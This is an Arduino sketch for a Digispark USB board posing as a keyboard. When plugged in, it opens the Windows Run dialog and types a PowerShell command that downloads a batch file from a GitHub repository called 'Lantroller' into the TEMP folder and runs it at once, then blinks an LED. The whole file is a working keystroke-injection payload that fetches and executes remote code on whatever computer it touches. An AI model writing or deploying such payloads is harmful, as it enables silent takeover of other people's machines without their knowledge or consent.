#include "DigiKeyboard.h"
#include <avr/power.h>

void setup() {
  clock_prescale_set(clock_div_1); // Set clock to full speed
  
  pinMode(1, OUTPUT);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -Command \"Invoke-WebRequest -Uri \\\"https://raw.githubusercontent.com/KRWCLASSIC/Lantroller/refs/heads/main/install.bat\\\" -OutFile \\\"$env:TEMP\\\\install.bat\\\" -ErrorAction Stop; & \\\"$env:TEMP\\\\install.bat\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(1000);
}
